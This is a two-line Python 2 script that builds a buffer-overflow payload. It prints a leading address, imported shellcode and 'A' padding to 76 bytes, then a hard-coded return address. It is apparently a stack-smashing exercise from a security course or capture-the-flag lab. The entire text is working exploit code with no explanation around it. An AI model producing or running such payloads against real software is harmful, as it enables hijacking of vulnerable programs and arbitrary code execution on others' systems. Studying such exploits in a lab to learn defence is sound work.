from shellcode import shellcode
print "\x04\x00\x00\x40"+shellcode+"A"*(76-len(shellcode))+"\x04\xe0\xff\xb7"
